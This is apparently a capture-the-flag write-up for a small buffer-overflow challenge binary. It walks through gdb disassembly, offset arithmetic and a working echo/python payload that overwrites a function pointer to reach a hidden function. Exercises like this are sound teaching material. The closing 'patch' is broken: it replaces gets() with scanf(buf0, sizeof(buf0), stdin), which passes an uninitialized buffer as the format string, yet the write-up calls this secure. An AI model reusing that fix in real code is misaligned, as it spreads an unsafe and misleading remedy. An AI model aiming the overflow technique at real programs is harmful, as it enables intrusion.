Let's look at the source code...

```
#include <stdio.h>
#include <stdlib.h>

int nothing_interesting()
{

	printf("Level Cleared\n");
}

int main()
{
	char buf1[55];
	char buf0[300];
	volatile int (*var1)();
	var1 = 0;

	gets(buf0);

	if (var1)
	{
		printf("Wait, you aren't supposed to be here\n");
		var1();
	}

	else
	{
		printf("O look you didn't solve this. How very predictable\n");
	}
}
```

So we can see that our objective lies in the nothing_interesting() function. However it doesn't call it anywhere in the main function.
However it does call a function, which was declared as a volatile int. In addition to that it has a buffer overflow vulnerabillity where it uses gets() to read into buf0.
So we should be able to exploit this program by overflowing buf0 to rewrite var1 with the address of the nothing_interesting() function.
This way, the if then statement will evaluate as true and when the var1() call runs, it will run the nothing_interesting() function. Also
buf1 doesn't serve any purpose as far as I can tell. It's just there to troll with you. So let's solve this with gdb.

First fire up gdb
```
guyinatuxedo@tux:/Hackery/cr@ck_th3_c0de/buf_ovf/2$ gdb ./b2 
```

One wall of text later...

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x08048454 <+0>:	lea    ecx,[esp+0x4]
   0x08048458 <+4>:	and    esp,0xfffffff0
   0x0804845b <+7>:	push   DWORD PTR [ecx-0x4]
   0x0804845e <+10>:	push   ebp
   0x0804845f <+11>:	mov    ebp,esp
   0x08048461 <+13>:	push   ecx
   0x08048462 <+14>:	sub    esp,0x174
   0x08048468 <+20>:	mov    DWORD PTR [ebp-0xc],0x0
   0x0804846f <+27>:	sub    esp,0xc
   0x08048472 <+30>:	lea    eax,[ebp-0x16f]
   0x08048478 <+36>:	push   eax
   0x08048479 <+37>:	call   0x8048300 <gets@plt>
   0x0804847e <+42>:	add    esp,0x10
   0x08048481 <+45>:	cmp    DWORD PTR [ebp-0xc],0x0
   0x08048485 <+49>:	je     0x804849e <main+74>
   0x08048487 <+51>:	sub    esp,0xc
   0x0804848a <+54>:	push   0x8048550
   0x0804848f <+59>:	call   0x8048310 <puts@plt>
   0x08048494 <+64>:	add    esp,0x10
   0x08048497 <+67>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0804849a <+70>:	call   eax
   0x0804849c <+72>:	jmp    0x80484ae <main+90>
---Type <return> to continue, or q <return> to quit---
   0x0804849e <+74>:	sub    esp,0xc
   0x080484a1 <+77>:	push   0x8048578
   0x080484a6 <+82>:	call   0x8048310 <puts@plt>
   0x080484ab <+87>:	add    esp,0x10
   0x080484ae <+90>:	mov    eax,0x0
   0x080484b3 <+95>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x080484b6 <+98>:	leave  
   0x080484b7 <+99>:	lea    esp,[ecx-0x4]
   0x080484ba <+102>:	ret    
End of assembler dump.
```

So right now, we are looking at the assembly code. First thing we should figure out is how much data we will need to input in order to overflow the buffer and write over the
var1 volatile int. Let's see if we can find out where in memeory the buffer starts.

```
   0x08048472 <+30>:	lea    eax,[ebp-0x16f]
   0x08048478 <+36>:	push   eax
   0x08048479 <+37>:	call   0x8048300 <gets@plt>
```

Looking here we can see the assembly call for the gets() function. We know that the gets() function uses buf0 (the buffer we are after) as it's argument.
Thing is we see the lea instruction with a stack position. The lea address prepares an area of memory (like a buffer) to be pushed onto the stack and used by a function.
Since function paramters are pushed onto the stack right before the function is called, it is probably the buffer we are after which is stored at ebp-0x16f.

Next we need to see where the int is stored. We know that it is used in an if then statement, which assembly does that through the use of a cmp function (cmp function just compares two things by subtracting one from another).

```
   0x08048481 <+45>:	cmp    DWORD PTR [ebp-0xc],0x0
   0x08048485 <+49>:	je     0x804849e <main+74>
```

So we can see that a value on the stack is being compared to 0 (which is what ints are compared to in an if then statment like the one were dealing with).
So we can be pretty sure that the stack location is ebp-0xc.

So we know the two stack loactions. let's caluclate the differece using python.

```
guyinatuxedo@tux:~$ python
Python 2.7.12 (default, Nov 19 2016, 06:48:10) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x16f - 0xc
355
>>> exit()
```

So as you can see, the difference is 355 bytes. So we should be able to write 356 characters and overflow the variable. Let's try it.

```
guyinatuxedo@tux:/Hackery/cr@ck_th3_c0de/buf_ovf/2$ echo `python -c 'print "1"*356'` | ./b2
Wait, you aren't supposed to be here
Segmentation fault (core dumped)
```

So we have determined the buffer. Next thing is we need the address of the nothing_interesting() function. We can get it using objdump.

```
guyinatuxedo@tux:/Hackery/cr@ck_th3_c0de/buf_ovf/2$ objdump -D b2 | grep nothing_interesting
0804843b <nothing_interesting>:
```

So we have the address of the nothing_interesting() function which is 0x0804843b. So let's consrtuct the payload. Our payload will consist of two entities.

```
Filler = 355 characters

Address = 0x0804843b (in little endian)
```

So let's try our exploit...

```
guyinatuxedo@tux:/Hackery/cr@ck_th3_c0de/buf_ovf/2$ echo `python -c 'print "0"*355 + "\x3b\x84\x04\x08"'` | ./b2
Wait, you aren't supposed to be here
Level Cleared
```

And just like that, we pwned the binary. 


Now let's patch the program. 

````
#include <stdio.h>
#include <stdlib.h>

int nothing_interesting()
{

	printf("Level Cleared\n");
}

int main()
{
//	char buf1[55];
	char buf0[300];
	volatile int (*var1)();
	var1 = 0;

	scanf(buf0, sizeof(buf0), stdin);

	if (var1)
	{
		printf("Wait, you aren't supposed to be here\n");
		var1();
	}

	else
	{
		printf("O look you didn't solve this. How very predictable\n");
	}
}
```

So as you can see we replaced the gets() function with a secure implementation of the scanf() function. In addition to that we commented out the unused buf1 buffer.
Now let's see if we actually patched it.

```
guyinatuxedo@tux:/Hackery/cr@ck_th3_c0de/buf_ovf/2$ echo `python -c 'print "0"*355 + "\x3b\x84\x04\x08"'` | ./b2_secure
O look you didn't solve this. How very predictable
```

And just like that, we patched the binary

